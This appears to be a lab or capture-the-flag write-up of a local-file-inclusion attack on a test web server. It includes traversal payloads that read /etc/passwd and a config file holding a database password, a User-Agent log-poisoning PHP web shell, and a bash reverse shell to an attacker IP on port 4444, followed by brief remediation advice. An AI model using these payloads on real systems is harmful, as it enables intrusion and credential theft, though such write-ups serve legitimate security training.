# LFI to Reverse Shell - Complete Writeup

## Target: `http://172.20.5.208`

---

## Step 1: Reconnaissance
The target is a simple web application where content is dynamically loaded via the `page` parameter.

**Initial Test:** `http://172.20.5.208/index.php?page=home.php`

---

## Step 2: LFI Discovery
I attempted a directory traversal attack on the `page` parameter to verify a Local File Inclusion (LFI) vulnerability:

**Payload:** `http://172.20.5.208/index.php?page=../../../etc/passwd`

**Result:** **Success!** The `/etc/passwd` file was successfully read, confirming the vulnerability.

---

## Step 3: Enumerating Users
Based on the `/etc/passwd` content:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... [other system users] ...
capella:x:1000:1000:capella user,45,1111111111,,second user:/home/capella:/bin/bash

```

**Findings:**

* **First user:** `root`
* **Second user:** `daemon`
* **Target user:** `capella` (UID 1000), identified as the primary regular user.

---

## Step 4: Finding Configuration Files

Using the LFI, I checked for sensitive configuration files on the server:

**Payload:** `http://172.20.5.208/index.php?page=../../../var/www/html/config.php`

**Config.php content:**

```php
<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'webapp');
define('DB_PASSWORD', '6UabF6Ff7XJq8PMtA');
define('DB_NAME', 'users_db');
?>

```

**Credentials Obtained:**

* **Database Password:** `6UabF6Ff7XJq8PMtA`

---

## Step 5: Log Poisoning for RCE

I confirmed that the Apache access logs were accessible via the LFI:
`http://172.20.5.208/index.php?page=../../../var/log/apache2/access.log`

### Poisoning the Logs

I injected PHP code into the logs by modifying the `User-Agent` header using `curl`:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" [http://172.20.5.208/](http://172.20.5.208/)

```

### Command Execution Test

I verified Remote Code Execution (RCE) by passing a command to the poisoned log file:
`http://172.20.5.208/index.php?page=../../../var/log/apache2/access.log&cmd=id`

**Result:** **Success!** The system returned the `uid`, `gid`, and `groups` of the web user.

---

## Step 6: Reverse Shell

### 1. Start Listener

```bash
nc -nlvp 4444

```

### 2. Execute Payload

I used the following encoded bash payload via the `cmd` parameter:
`http://172.20.5.208/index.php?page=../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.8.127/4444+0>%261'`

**Shell Received:**

```bash
www-data@debian:/var/www/html$

```

---

## Step 7: Local Enumeration

After gaining access, I checked the `/home` directory to identify local users:

```bash
ls /home
# Output: capella

```

---

## Summary of Findings

1. **Second User on System:** `capella` (The second user identified with a login shell).
2. **Database Password:** `6UabF6Ff7XJq8PMtA`

---

## Vulnerability Chain

> **LFI (Directory Traversal)** → **Log File Access** → **Log Poisoning** → **RCE** → **Reverse Shell**

## Remediation

* Use **allowlists** for file inclusion parameters.
* **Disable log file access** from the web root and restrict permissions.
* Implement strict **input validation** and sanitization.
* Use **parameterized queries** for database security.
* **Restrict PHP execution** in directories where logs or user uploads are stored.

---

**Difficulty:** Easy-Medium

**Time Taken:** 15-20 Minutes

**Tools:** Browser, Netcat, Curl

